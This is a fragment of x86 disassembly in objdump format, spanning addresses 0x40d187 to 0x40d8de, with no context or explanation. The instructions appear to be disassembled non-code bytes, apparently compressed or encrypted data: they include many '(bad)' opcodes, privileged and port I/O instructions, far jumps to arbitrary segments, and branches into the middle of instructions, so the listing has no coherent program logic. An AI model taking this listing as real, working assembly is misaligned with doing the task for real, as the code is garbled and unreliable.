  40d187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d188:	sahf   
  40d189:	pop    ecx
  40d18a:	push   0xb75e788b
  40d18f:	aaa    
  40d190:	cmp    edi,esp
  40d192:	xor    ebp,edi
  40d194:	clc    
  40d195:	push   esp
  40d196:	mov    edx,0x724331ee
  40d19b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d19c:	arpl   WORD PTR [edi],dx
  40d19e:	lods   eax,DWORD PTR ds:[esi]
  40d19f:	or     dh,BYTE PTR [eax+ebp*8+0x15]
  40d1a3:	sub    eax,0xb69c56e1
  40d1a8:	outs   dx,DWORD PTR cs:[esi]
  40d1aa:	or     ebx,DWORD PTR [ebp+0x57]
  40d1ad:	(bad)  
  40d1ae:	shl    BYTE PTR [ebp-0x45],1
  40d1b1:	lea    edx,[ebp-0x7b]
  40d1b4:	push   es
  40d1b5:	ret    
  40d1b6:	cli    
  40d1b7:	shl    BYTE PTR [eax-0x316c385f],cl
  40d1bd:	aaa    
  40d1be:	stos   BYTE PTR es:[edi],al
  40d1bf:	sub    al,BYTE PTR [edi-0x39]
  40d1c2:	fld    QWORD PTR [edi]
  40d1c4:	jge    0x40d187
  40d1c6:	sar    BYTE PTR ds:0x36db755f,1
  40d1cc:	out    dx,al
  40d1cd:	add    ecx,edx
  40d1cf:	test   DWORD PTR ds:0x608b188,esp
  40d1d5:	jg     0x40d171
  40d1d7:	(bad)  
  40d1d9:	add    ebx,DWORD PTR [edi]
  40d1db:	ins    DWORD PTR es:[edi],dx
  40d1dc:	adc    DWORD PTR [edx],edi
  40d1de:	aad    0x3a
  40d1e0:	sbb    eax,0x31af0350
  40d1e5:	popf   
  40d1e6:	lods   eax,DWORD PTR ds:[esi]
  40d1e7:	push   ds
  40d1e8:	mov    BYTE PTR [esi-0x2840210c],al
  40d1ee:	test   al,0x65
  40d1f0:	sbb    DWORD PTR [ecx],esi
  40d1f2:	adc    bp,WORD PTR [edx-0x10786cfc]
  40d1f9:	fs nop
  40d1fb:	in     al,dx
  40d1fc:	mov    edi,0x601b7e33
  40d201:	stos   BYTE PTR es:[edi],al
  40d202:	mov    edx,0x7210694c
  40d207:	leave  
  40d208:	popa   
  40d209:	cli    
  40d20a:	pusha  
  40d20b:	push   ebp
  40d20c:	arpl   cx,bp
  40d20e:	imul   eax,DWORD PTR [eax+0x72],0xffffff82
  40d212:	rcl    esp,0xfc
  40d215:	neg    ebp
  40d217:	ins    BYTE PTR es:[edi],dx
  40d218:	jg     0x40d218
  40d21a:	cmp    ebx,edi
  40d21c:	daa    
  40d21d:	xchg   esp,eax
  40d21e:	inc    esp
  40d21f:	fisttp DWORD PTR [ebx+0x71]
  40d222:	std    
  40d223:	mov    ah,0x9c
  40d225:	sbb    al,0xca
  40d227:	add    al,0x92
  40d229:	mov    ds:0x64fb5b8d,al
  40d22e:	adc    al,0xc2
  40d230:	push   ebx
  40d231:	push   edi
  40d232:	cmp    eax,0x71c16cff
  40d237:	pop    edx
  40d238:	pop    ebx
  40d239:	call   0xcf1b:0xa18a3666
  40d240:	push   0xc3e811b0
  40d245:	mov    WORD PTR [ebp-0xa427eae],?
  40d24b:	mov    ds,WORD PTR [edx-0x6907538e]
  40d251:	fldcw  WORD PTR [eax+0x46]
  40d254:	mov    bh,0x19
  40d256:	icebp  
  40d257:	(bad)  
  40d258:	sbb    dl,BYTE PTR [esi+0x7bd77b86]
  40d25e:	je     0x40d26f
  40d260:	jns    0x40d2db
  40d262:	and    al,0x9d
  40d264:	pop    ebp
  40d265:	(bad)  
  40d266:	mov    ch,0x14
  40d268:	mov    ebp,0x126067a9
  40d26d:	xchg   edi,eax
  40d26e:	leave  
  40d26f:	scas   eax,DWORD PTR es:[edi]
  40d270:	pop    edi
  40d271:	outs   dx,BYTE PTR ds:[esi]
  40d272:	jmp    0x40d20d
  40d274:	outs   dx,BYTE PTR ds:[esi]
  40d275:	sub    esp,ecx
  40d277:	pop    ds
  40d278:	mov    WORD PTR [edi-0x353b14dd],es
  40d27e:	aas    
  40d27f:	inc    ebx
  40d280:	pop    ds
  40d281:	inc    esp
  40d282:	rol    DWORD PTR [ebx],0xd0
  40d285:	adc    eax,0x8e2acd7d
  40d28a:	mov    dl,0xe0
  40d28c:	pop    edi
  40d28d:	push   0x562e184b
  40d292:	xchg   BYTE PTR [eax],dh
  40d294:	in     eax,dx
  40d295:	cs pop ecx
  40d297:	push   0x0
  40d299:	add    DWORD PTR [ecx-0x6d],ebx
  40d29c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d29d:	jne    0x40d263
  40d29f:	pushf  
  40d2a0:	int3   
  40d2a1:	mov    dl,0x96
  40d2a3:	or     BYTE PTR [edi+0x435f8f8e],bh
  40d2a9:	imul   ebx,DWORD PTR [esi],0x6b
  40d2ac:	mov    ah,0x4c
  40d2ae:	dec    ecx
  40d2af:	frstor [edx]
  40d2b1:	aad    0x57
  40d2b3:	addr16 fwait
  40d2b5:	mov    ds:0xee1137ba,eax
  40d2ba:	push   eax
  40d2bb:	jmp    0x40d30e
  40d2bd:	sbb    ecx,DWORD PTR [ebp+0x619a6386]
  40d2c3:	jecxz  0x40d2da
  40d2c5:	lahf   
  40d2c6:	out    dx,eax
  40d2c7:	ret    0xff94
  40d2ca:	ffreep st(7)
  40d2cc:	ror    eax,cl
  40d2ce:	and    cl,al
  40d2d0:	rcr    BYTE PTR [eax],1
  40d2d2:	inc    edi
  40d2d3:	(bad)  
  40d2d4:	push   eax
  40d2d5:	or     edx,eax
  40d2d7:	test   esp,edi
  40d2d9:	mov    edi,0xbf069453
  40d2de:	jo     0x40d334
  40d2e0:	outs   dx,DWORD PTR ds:[esi]
  40d2e1:	aam    0x7a
  40d2e3:	neg    BYTE PTR [ecx]
  40d2e5:	stos   BYTE PTR es:[edi],al
  40d2e6:	mov    ah,0xa8
  40d2e8:	call   0xd29b:0xde3317fa
  40d2ef:	daa    
  40d2f0:	xchg   ebx,eax
  40d2f1:	push   ebx
  40d2f2:	push   cs
  40d2f3:	jmp    FWORD PTR [edx-0x7b]
  40d2f6:	out    dx,al
  40d2f7:	mov    ebp,DWORD PTR [ecx+0x29cc6b48]
  40d2fd:	jo     0x40d280
  40d2ff:	int3   
  40d300:	outs   dx,DWORD PTR ds:[esi]
  40d301:	ins    BYTE PTR es:[edi],dx
  40d302:	push   es
  40d303:	icebp  
  40d304:	(bad)  
  40d305:	(bad)  
  40d306:	cmp    BYTE PTR [ebp+0x61678f09],ch
  40d30c:	test   DWORD PTR [edi],esp
  40d30e:	cli    
  40d30f:	fcomp  QWORD PTR [edx+0x77]
  40d312:	xchg   BYTE PTR [ebp-0x2d],dh
  40d315:	jmp    0x16a113b4
  40d31a:	pusha  
  40d31b:	arpl   WORD PTR [esi-0x201ec5fa],sp
  40d321:	sar    BYTE PTR ds:0xf7526006,0x88
  40d328:	loope  0x40d366
  40d32a:	pop    ebp
  40d32b:	ss aad 0x52
  40d32e:	xchg   ebp,eax
  40d32f:	add    al,0x2c
  40d331:	inc    eax
  40d332:	mov    DWORD PTR [edi],edx
  40d334:	push   cs
  40d335:	in     eax,dx
  40d336:	mov    DWORD PTR [esi+0x69],eax
  40d339:	cmc    
  40d33a:	shl    dl,cl
  40d33c:	and    ah,BYTE PTR [edx-0x51]
  40d33f:	mov    esp,0xa16981f8
  40d344:	sbb    BYTE PTR [ecx+ecx*8],0x61
  40d348:	inc    ecx
  40d349:	pop    DWORD PTR [ebp-0x3b]
  40d34c:	imul   esi,DWORD PTR [esi+0x5e],0x77ba3b6
  40d353:	mov    ebx,0xf0f4dd5d
  40d358:	jl     0x40d31a
  40d35a:	cmp    al,0xff
  40d35c:	ror    BYTE PTR [ebp+0xa],cl
  40d35f:	pop    edx
  40d360:	out    dx,eax
  40d361:	jnp    0x40d3de
  40d363:	das    
  40d364:	dec    eax
  40d365:	push   eax
  40d366:	push   ecx
  40d367:	scas   eax,DWORD PTR es:[edi]
  40d368:	repz jae 0x40d3c4
  40d36b:	xchg   ecx,eax
  40d36c:	not    BYTE PTR [eax]
  40d36e:	jl     0x40d33f
  40d370:	mov    DWORD PTR [edi],ebp
  40d372:	or     ebx,DWORD PTR [edi-0x6c]
  40d375:	jb     0x40d3ac
  40d377:	xchg   edi,eax
  40d378:	or     al,0xdf
  40d37a:	pop    ss
  40d37b:	into   
  40d37c:	inc    ebp
  40d37d:	push   ebx
  40d37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d37f:	or     ah,BYTE PTR [eax+0x791a7383]
  40d385:	sbb    DWORD PTR [ecx],eax
  40d387:	mov    ch,0x36
  40d389:	ja     0x40d375
  40d38b:	mov    edx,0xfbe2bb24
  40d390:	add    ebp,DWORD PTR [edx]
  40d392:	sub    BYTE PTR ds:0xb6ca25b0,0x4
  40d399:	sub    al,0x3a
  40d39b:	scas   eax,DWORD PTR es:[edi]
  40d39c:	(bad)  
  40d39d:	xchg   esi,eax
  40d39e:	hlt    
  40d39f:	mov    edi,0xba883674
  40d3a4:	jnp    0x40d350
  40d3a6:	imul   ebx,esp,0x72
  40d3a9:	add    DWORD PTR [edi-0x425ff845],edi
  40d3af:	jnp    0x40d38c
  40d3b1:	xchg   BYTE PTR [edi-0x6a],ch
  40d3b4:	push   esi
  40d3b5:	jmp    0x207:0xdcccf627
  40d3bc:	and    eax,0x1794a02b
  40d3c1:	fst    DWORD PTR [edx-0x10]
  40d3c4:	loope  0x40d346
  40d3c6:	and    BYTE PTR [ebp+0x5398724d],al
  40d3cc:	out    dx,al
  40d3cd:	(bad)  
  40d3ce:	jmp    0x40d401
  40d3d0:	jns    0x40d39a
  40d3d2:	stc    
  40d3d3:	daa    
  40d3d4:	mov    al,ds:0xa71ac5bb
  40d3d9:	clc    
  40d3da:	fimul  DWORD PTR [edi+0x41]
  40d3dd:	mov    ecx,0x5f4b6ad5
  40d3e2:	dec    edx
  40d3e3:	out    0x55,al
  40d3e5:	aad    0x6b
  40d3e7:	push   eax
  40d3e8:	cmc    
  40d3e9:	mov    ah,0x5e
  40d3eb:	rol    DWORD PTR [ebx-0x3150d79a],1
  40d3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f2:	inc    edx
  40d3f3:	(bad)  
  40d3f4:	dec    ebp
  40d3f5:	push   ss
  40d3f6:	pop    es
  40d3f7:	add    bh,ah
  40d3f9:	int3   
  40d3fa:	jecxz  0x40d43f
  40d3fc:	lea    edi,[ebx-0x2e448cc9]
  40d402:	std    
  40d403:	xchg   ecx,eax
  40d404:	or     BYTE PTR ds:0xe27985b2,0x9d
  40d40b:	(bad)  
  40d40c:	adc    al,0xff
  40d40e:	shr    BYTE PTR [edi],1
  40d410:	push   esi
  40d411:	inc    esp
  40d412:	mov    eax,ds:0x86349b9a
  40d417:	call   0xa76ce7b2
  40d41c:	sub    esi,DWORD PTR [edx+0x136376ea]
  40d422:	lea    ebx,[edi-0x497afeea]
  40d428:	outs   dx,DWORD PTR ds:[esi]
  40d429:	pop    edx
  40d42a:	sub    eax,0x7fd737b4
  40d42f:	mov    ebx,ecx
  40d431:	into   
  40d432:	call   0xcf42:0x8e910e44
  40d439:	jmp    0x72c1:0x7381526f
  40d440:	fcom   DWORD PTR ds:0xb004c4a8
  40d446:	nop
  40d447:	xchg   esi,eax
  40d448:	mov    dh,0x95
  40d44a:	inc    edx
  40d44b:	dec    edx
  40d44c:	mov    esi,0x42486fc0
  40d451:	adc    eax,DWORD PTR [esi]
  40d453:	mov    edi,0x61beaece
  40d458:	inc    edi
  40d459:	pushf  
  40d45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d45b:	test   eax,0x89cedaf7
  40d460:	mov    ah,0x7c
  40d462:	push   0xffffffe4
  40d464:	(bad)  
  40d465:	fcmovb st,st(1)
  40d467:	retf   
  40d468:	arpl   ax,bx
  40d46a:	out    0x86,eax
  40d46c:	xor    BYTE PTR [edi],bh
  40d46e:	imul   ecx,DWORD PTR [edx-0x3c5ea46b],0x5a
  40d475:	jbe    0x40d4d8
  40d477:	and    edx,ecx
  40d479:	inc    edx
  40d47a:	jge    0x40d4f5
  40d47c:	loope  0x40d4aa
  40d47e:	push   esi
  40d47f:	ffree  st(5)
  40d481:	shl    ebp,0x30
  40d484:	push   ebp
  40d485:	cmp    esi,DWORD PTR [edx+0x68]
  40d488:	sbb    dl,cl
  40d48a:	lahf   
  40d48b:	imul   edi,DWORD PTR [esi-0x260ab50],0xec099099
  40d495:	ds add eax,0xbc377d07
  40d49b:	loope  0x40d446
  40d49d:	cld    
  40d49e:	xor    BYTE PTR [ebp-0x29b9937b],bl
  40d4a4:	pusha  
  40d4a5:	in     eax,dx
  40d4a6:	inc    esi
  40d4a7:	ret    
  40d4a8:	pop    eax
  40d4a9:	stos   BYTE PTR es:[edi],al
  40d4aa:	mov    esp,0xbeb4430a
  40d4af:	ss sahf 
  40d4b1:	addr16 dec esp
  40d4b3:	int3   
  40d4b4:	clc    
  40d4b5:	push   ebp
  40d4b6:	(bad)  
  40d4b7:	leave  
  40d4b8:	or     BYTE PTR [eax+0x1dd1c9cb],ch
  40d4be:	test   al,0x9a
  40d4c0:	lea    ebp,[esi+0x4e2abbd]
  40d4c6:	int    0x85
  40d4c8:	mov    ds:0x2881cc68,eax
  40d4cd:	fdiv   DWORD PTR [ecx]
  40d4cf:	cmp    ebx,DWORD PTR [edx+edi*2-0x56]
  40d4d3:	sub    dl,0xa0
  40d4d6:	mov    ch,0xde
  40d4d8:	sar    al,0xe8
  40d4db:	je     0x40d4b8
  40d4dd:	push   esi
  40d4de:	sub    ebp,DWORD PTR [ebp+0xeef493]
  40d4e4:	adc    esi,0xe68e5884
  40d4ea:	pop    ds
  40d4eb:	gs pop ebp
  40d4ed:	mov    ds:0xf220dd66,eax
  40d4f2:	push   0x2d
  40d4f4:	retf   
  40d4f5:	and    ebp,DWORD PTR [ebx+0x1b7c1405]
  40d4fb:	cmp    al,0x90
  40d4fd:	dec    edx
  40d4fe:	sahf   
  40d4ff:	jle    0x40d4e8
  40d501:	and    cl,BYTE PTR [edi]
  40d503:	and    al,0x8
  40d505:	dec    ebp
  40d506:	adc    DWORD PTR [esi-0x2f],ecx
  40d509:	jl     0x40d4fd
  40d50b:	mov    ebx,edi
  40d50d:	nop
  40d50e:	xor    DWORD PTR [ebx-0x4808217c],edx
  40d514:	mov    ecx,0xf37ceec0
  40d519:	jbe    0x40d4e4
  40d51b:	(bad)  
  40d51c:	cmp    al,0xb8
  40d51e:	nop
  40d51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d520:	mov    ds:0x2d5b8c81,eax
  40d525:	pop    esi
  40d526:	xchg   esp,eax
  40d527:	icebp  
  40d528:	imul   edx,edx,0x1bf1f80
  40d52e:	mov    ebp,0x21cfde53
  40d533:	imul   esi,DWORD PTR [ebx],0x97f2ca37
  40d539:	aaa    
  40d53a:	test   al,0x4
  40d53c:	mov    dl,0x21
  40d53e:	ror    BYTE PTR [ecx-0x4d],1
  40d541:	or     al,BYTE PTR [edx-0x35]
  40d544:	out    dx,eax
  40d545:	push   cs
  40d546:	in     eax,dx
  40d547:	push   0xffffffce
  40d549:	je     0x40d5ae
  40d54b:	xor    eax,0xddd69cbb
  40d550:	xchg   edx,eax
  40d551:	adc    ebx,eax
  40d553:	push   ebx
  40d554:	lods   al,BYTE PTR ds:[esi]
  40d555:	dec    esi
  40d556:	jge    0x40d5ca
  40d558:	enter  0x8a4a,0xa4
  40d55c:	mov    ebx,DWORD PTR [ecx-0x6c]
  40d55f:	pop    ds
  40d560:	dec    ebx
  40d561:	and    bl,BYTE PTR ds:0xd74f9da8
  40d567:	scas   eax,DWORD PTR es:[edi]
  40d568:	daa    
  40d569:	cwde   
  40d56a:	in     al,0x34
  40d56c:	push   edi
  40d56d:	adc    DWORD PTR [ebx+ebx*2],ebp
  40d570:	mov    bl,BYTE PTR [edx+0x6c]
  40d573:	popa   
  40d574:	daa    
  40d575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d576:	push   ebp
  40d577:	fwait
  40d578:	pop    esi
  40d579:	pushf  
  40d57a:	ret    
  40d57b:	jmp    0x40d5b3
  40d57d:	sub    esp,DWORD PTR [ecx-0x7d590a10]
  40d583:	loopne 0x40d541
  40d585:	(bad)  
  40d586:	stos   DWORD PTR es:[edi],eax
  40d587:	mov    DWORD PTR [ebp+0x4b5f1e28],ebx
  40d58d:	clc    
  40d58e:	popf   
  40d58f:	cwde   
  40d590:	add    eax,0xc7f84cb7
  40d595:	xlat   BYTE PTR ds:[ebx]
  40d596:	push   edx
  40d597:	xchg   DWORD PTR [ebp-0x63406b19],ecx
  40d59d:	cs fwait
  40d59f:	rol    DWORD PTR [edi+0x54],cl
  40d5a2:	mov    al,0xd2
  40d5a4:	inc    edx
  40d5a5:	mov    ebp,0x8904cbeb
  40d5aa:	jae    0x40d54b
  40d5ac:	push   edi
  40d5ad:	and    BYTE PTR [ebp+0x6942849c],al
  40d5b3:	inc    ebp
  40d5b4:	mov    ebp,0x3b696e3
  40d5b9:	or     eax,0xd7bd45ad
  40d5be:	sbb    dl,bl
  40d5c0:	pop    ecx
  40d5c1:	or     al,0x2e
  40d5c3:	and    BYTE PTR [esi+0x969df8d],bh
  40d5c9:	fmul   DWORD PTR [edi+eax*2-0x5194aea5]
  40d5d0:	call   FWORD PTR [ebx]
  40d5d2:	aaa    
  40d5d3:	add    DWORD PTR [ebx],0x1bec9047
  40d5d9:	shr    BYTE PTR ds:0x2b4d2256,cl
  40d5df:	cmp    DWORD PTR [edx+esi*2],eax
  40d5e2:	mov    cl,0xde
  40d5e4:	pop    edi
  40d5e5:	push   ecx
  40d5e6:	fwait
  40d5e7:	and    eax,0x4f8c620f
  40d5ec:	push   ecx
  40d5ed:	pop    esp
  40d5ee:	cli    
  40d5ef:	jns    0x40d596
  40d5f1:	add    DWORD PTR [ecx-0x36],0xb2032295
  40d5f8:	mov    cl,0x1
  40d5fb:	or     ch,ch
  40d5fd:	stos   DWORD PTR es:[edi],eax
  40d5fe:	xchg   ecx,eax
  40d5ff:	mov    cl,0x10
  40d601:	in     al,dx
  40d602:	les    eax,FWORD PTR [ecx]
  40d604:	sbb    bh,dl
  40d606:	sbb    eax,0xdcbf5acb
  40d60b:	mov    esp,gs
  40d60d:	rol    BYTE PTR [esi-0x5c],cl
  40d610:	sti    
  40d611:	shr    DWORD PTR [edx-0x1e],cl
  40d614:	retf   0xf8ae
  40d617:	rcl    BYTE PTR [esi+esi*4],0x4b
  40d61b:	xchg   ebp,eax
  40d61c:	or     eax,0x98ba155c
  40d621:	scas   al,BYTE PTR es:[edi]
  40d622:	test   eax,0xff1a33d8
  40d627:	mov    es,edx
  40d629:	xchg   BYTE PTR [esi],bh
  40d62b:	movd   mm4,edi
  40d62e:	cmp    eax,0x5c2a1af6
  40d633:	sar    cl,1
  40d635:	ins    BYTE PTR es:[edi],dx
  40d636:	cld    
  40d637:	jle    0x40d612
  40d639:	sbb    al,0xb8
  40d63b:	es pushf 
  40d63d:	adc    esi,edx
  40d63f:	and    BYTE PTR [ebx-0x55],0xc2
  40d643:	cli    
  40d644:	icebp  
  40d645:	sub    ebp,edi
  40d647:	add    al,0x7
  40d649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d64a:	xchg   esi,eax
  40d64b:	inc    ecx
  40d64c:	lds    ecx,FWORD PTR [eax+eiz*2-0x7d2ebd01]
  40d653:	cdq    
  40d654:	arpl   WORD PTR [ebx+0x7ce80958],sp
  40d65a:	jp     0x40d6a7
  40d65c:	outs   dx,BYTE PTR ds:[esi]
  40d65d:	jae    0x40d656
  40d65f:	leave  
  40d660:	push   ebx
  40d661:	push   cs
  40d662:	push   esi
  40d663:	jle    0x40d63f
  40d665:	sbb    al,0x94
  40d667:	retf   
  40d668:	add    ebp,DWORD PTR [ebp+0x45]
  40d66b:	sbb    ah,BYTE PTR ds:0xddcfa9f5
  40d671:	fiadd  DWORD PTR [eax]
  40d673:	jae    0x40d654
  40d675:	xchg   ebx,eax
  40d676:	in     al,0xd0
  40d678:	rcl    BYTE PTR [edx],1
  40d67a:	jmp    0x40d64a
  40d67c:	in     eax,0x69
  40d67e:	adc    al,0x3c
  40d680:	sbb    BYTE PTR [ebx],bl
  40d682:	or     DWORD PTR [edx],esp
  40d684:	xlat   BYTE PTR ds:[ebx]
  40d685:	retf   0x3c7
  40d688:	loope  0x40d667
  40d68a:	sar    cl,1
  40d68c:	pop    ebp
  40d68d:	jno    0x40d674
  40d68f:	(bad)  
  40d691:	push   edx
  40d692:	scas   eax,DWORD PTR es:[edi]
  40d693:	sbb    al,0xc5
  40d695:	into   
  40d696:	adc    eax,0xfa1b48e5
  40d69b:	dec    edx
  40d69c:	test   BYTE PTR [esi],dl
  40d69e:	jbe    0x40d696
  40d6a0:	push   0x26fe4f45
  40d6a5:	xor    al,0xc3
  40d6a7:	(bad)  
  40d6a8:	into   
  40d6a9:	aas    
  40d6aa:	rcl    BYTE PTR [ecx+0x789e0469],0x3f
  40d6b1:	push   edx
  40d6b2:	xor    DWORD PTR [ebx],ecx
  40d6b4:	adc    cl,dh
  40d6b6:	hlt    
  40d6b7:	paddusb mm5,QWORD PTR [eax+0xaf363b]
  40d6be:	in     eax,0xa7
  40d6c0:	push   edx
  40d6c1:	inc    edi
  40d6c2:	out    0xf2,al
  40d6c4:	fst    st(4)
  40d6c6:	clc    
  40d6c7:	jmp    0xd1a8:0xc2ae5fc3
  40d6ce:	sub    DWORD PTR [eax],eax
  40d6d0:	je     0x40d6b5
  40d6d2:	in     al,0x91
  40d6d4:	push   ecx
  40d6d5:	cs jns 0x40d6a8
  40d6d8:	mov    dh,0xd7
  40d6da:	push   es
  40d6db:	int3   
  40d6dc:	xchg   ebx,eax
  40d6dd:	sbb    al,BYTE PTR [ebp-0x3c18e469]
  40d6e3:	sbb    al,0x7b
  40d6e5:	loopne 0x40d6ea
  40d6e7:	aas    
  40d6e8:	aam    0x8d
  40d6ea:	retf   
  40d6eb:	fwait
  40d6ec:	and    al,0x5c
  40d6ee:	xchg   ebx,eax
  40d6ef:	push   cs
  40d6f0:	mov    bl,0x4b
  40d6f2:	repnz push cs
  40d6f4:	fdivr  DWORD PTR [edx]
  40d6f6:	dec    edx
  40d6f7:	dec    edi
  40d6f8:	jmp    0x520386a7
  40d6fd:	(bad)  
  40d6fe:	push   edx
  40d6ff:	cmp    DWORD PTR [esi+0x70ca03b7],ecx
  40d705:	mov    dl,0xf4
  40d707:	dec    edi
  40d708:	test   edi,0x655e4fb8
  40d70e:	in     al,0xe5
  40d710:	push   ebx
  40d711:	lods   eax,DWORD PTR ds:[esi]
  40d712:	repz clc 
  40d714:	scas   eax,DWORD PTR es:[edi]
  40d715:	and    esi,DWORD PTR [eax*1+0x2016a2f4]
  40d71c:	inc    eax
  40d71d:	cmc    
  40d71e:	push   esp
  40d71f:	cdq    
  40d720:	xchg   edx,eax
  40d721:	sbb    DWORD PTR [edx],ebp
  40d723:	inc    esp
  40d724:	cld    
  40d725:	fst    DWORD PTR [edi-0xb]
  40d728:	fidivr DWORD PTR [ebx+edx*2]
  40d72b:	lods   al,BYTE PTR ds:[esi]
  40d72c:	lahf   
  40d72d:	dec    ecx
  40d72e:	xchg   ebp,eax
  40d72f:	cmp    eax,0x3d4fe227
  40d734:	and    al,0x8b
  40d736:	js     0x40d72e
  40d738:	lahf   
  40d739:	enter  0xbdc0,0xcb
  40d73d:	ins    BYTE PTR es:[edi],dx
  40d73e:	in     eax,dx
  40d73f:	inc    esi
  40d740:	fcom   DWORD PTR [edx]
  40d742:	pop    ds
  40d743:	mov    dh,0x99
  40d745:	out    dx,al
  40d746:	into   
  40d747:	cdq    
  40d748:	ficomp WORD PTR [esi+0x15]
  40d74b:	mov    DWORD PTR [edx+ebx*4],ebp
  40d74e:	add    eax,0xe2bfe432
  40d753:	scas   eax,DWORD PTR es:[di]
  40d755:	(bad)  
  40d756:	rol    DWORD PTR [eax-0x29],0x8e
  40d75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75b:	js     0x40d73e
  40d75d:	repnz lahf 
  40d75f:	pop    edx
  40d760:	xchg   esp,eax
  40d761:	push   ebx
  40d762:	fwait
  40d763:	jecxz  0x40d73f
  40d765:	xor    al,0xd
  40d767:	xchg   BYTE PTR [esi+0x3f],dh
  40d76a:	sub    al,0xc6
  40d76c:	xor    eax,0x22c9655f
  40d771:	stc    
  40d772:	clc    
  40d773:	clc    
  40d774:	xchg   DWORD PTR [ebx+0x3ae4d3f],ebx
  40d77a:	jg     0x40d752
  40d77c:	ret    0x9038
  40d77f:	test   eax,0x92bc96c3
  40d784:	or     DWORD PTR [esi+0x4f],esi
  40d787:	xor    DWORD PTR [edx+0x5],ecx
  40d78a:	jae    0x40d7b2
  40d78c:	fnsave [ebx+0x1687b5a1]
  40d792:	sti    
  40d793:	mov    cl,0x7
  40d795:	jbe    0x40d74b
  40d797:	into   
  40d798:	jmp    0xb972:0x470d9552
  40d79f:	sub    edi,DWORD PTR [esi-0x3e9d01a6]
  40d7a5:	jnp    0x40d77d
  40d7a7:	(bad)  
  40d7a8:	mov    edi,0x72a91481
  40d7ad:	push   ebp
  40d7ae:	(bad)  
  40d7af:	repz (bad) 
  40d7b1:	mov    ebx,0x5391c041
  40d7b6:	sbb    DWORD PTR [ebp+0x3e3d0b0b],edx
  40d7bc:	pop    edx
  40d7bd:	xchg   ecx,eax
  40d7be:	jp     0x40d77e
  40d7c0:	and    DWORD PTR [ecx-0x34],0x3aa25263
  40d7c7:	xchg   ebx,eax
  40d7c8:	pop    edi
  40d7c9:	sahf   
  40d7ca:	sub    DWORD PTR [edx-0x2d54fa47],0x47
  40d7d1:	sbb    eax,DWORD PTR [eax-0x6d]
  40d7d4:	sub    eax,0x1e1d3bd6
  40d7d9:	pop    eax
  40d7da:	sub    DWORD PTR [edx+0x4c2f8f1d],esi
  40d7e0:	sbb    BYTE PTR ds:0x3e727b94,0x42
  40d7e7:	aad    0x2a
  40d7e9:	mov    edi,0x4608b219
  40d7ee:	stos   BYTE PTR es:[edi],al
  40d7ef:	add    edi,DWORD PTR [edx]
  40d7f1:	mov    al,0x82
  40d7f3:	sub    eax,0x33617ed0
  40d7f8:	loop   0x40d809
  40d7fa:	fdivr  st,st(6)
  40d7fc:	cs dec edx
  40d7fe:	outs   dx,DWORD PTR ds:[esi]
  40d7ff:	adc    ebp,DWORD PTR [ebx+ebp*8-0x6f979806]
  40d806:	ja     0x40d809
  40d808:	sub    DWORD PTR [ebp+ebx*8-0x78c7a486],esp
  40d80f:	and    BYTE PTR [ebx-0x606962c3],ah
  40d815:	fdivr  QWORD PTR [ecx+eax*8]
  40d818:	mov    esi,esp
  40d81a:	dec    esp
  40d81b:	popf   
  40d81c:	and    BYTE PTR [ecx+0x1c266a3],bh
  40d822:	pop    ss
  40d823:	mov    al,ds:0x32bac290
  40d828:	nop
  40d829:	jo     0x40d857
  40d82b:	ss lahf 
  40d82d:	into   
  40d82e:	pop    es
  40d82f:	icebp  
  40d830:	jbe    0x40d842
  40d832:	adc    eax,0x52104ea6
  40d837:	inc    ebx
  40d838:	jns    0x40d82a
  40d83a:	ret    0x8c3
  40d83d:	jb     0x40d7f7
  40d83f:	mov    esi,0xfab118c1
  40d844:	outs   dx,BYTE PTR ds:[esi]
  40d845:	push   0xdd4001cd
  40d84a:	xor    al,0x70
  40d84c:	mov    WORD PTR cs:[edx-0x120a556f],es
  40d853:	or     bl,BYTE PTR [eax+0x22]
  40d856:	and    DWORD PTR [ebp-0xe6ebbe3],ebx
  40d85c:	mov    dh,0x97
  40d85e:	push   edi
  40d85f:	inc    ebp
  40d860:	mov    cl,0x9f
  40d862:	inc    eax
  40d863:	sub    dl,ah
  40d865:	sbb    ebx,0xffffff8e
  40d868:	ror    DWORD PTR [ebp+0x3a2d613],cl
  40d86e:	outs   dx,BYTE PTR ds:[esi]
  40d86f:	sub    DWORD PTR [ebx-0xcffa29c],esi
  40d875:	out    0xa1,al
  40d877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d878:	xor    DWORD PTR [edx-0x41],esi
  40d87b:	cs hlt 
  40d87d:	adc    eax,0xffe6f5e8
  40d882:	mov    ecx,0xfa9a8b8d
  40d887:	jmp    0x8c0fda86
  40d88c:	add    ah,bl
  40d88e:	clc    
  40d88f:	adc    al,0x30
  40d891:	ss push 0xfffffff2
  40d894:	add    al,0x97
  40d896:	lahf   
  40d897:	das    
  40d898:	add    bl,BYTE PTR [ebp+edx*8+0x6c5f03e2]
  40d89f:	imul   edx,DWORD PTR [edx-0x3f2cab69],0xfffffff5
  40d8a6:	and    DWORD PTR [ebx-0xc],edi
  40d8a9:	push   ecx
  40d8aa:	sbb    BYTE PTR [edi-0x7a],bh
  40d8ad:	sub    DWORD PTR [bx],0x43
  40d8b1:	dec    edi
  40d8b2:	pop    es
  40d8b3:	adc    BYTE PTR [ebp+0x4],dh
  40d8b6:	mov    al,0x42
  40d8b8:	add    edi,DWORD PTR [edi-0x15b8824e]
  40d8be:	rol    DWORD PTR [esi],1
  40d8c0:	inc    edi
  40d8c1:	adc    DWORD PTR [eax],edx
  40d8c3:	les    edx,FWORD PTR [edi-0x54]
  40d8c6:	ds adc al,0x68
  40d8c9:	sub    al,0xab
  40d8cb:	lods   eax,DWORD PTR ds:[esi]
  40d8cc:	sbb    DWORD PTR [ebp-0x4368e79e],ebp
  40d8d2:	add    DWORD PTR [ebx+0x6b0b0e6],0x4f
  40d8d9:	mov    edx,0xa3b200f3
  40d8de:	mov    dh,0x56
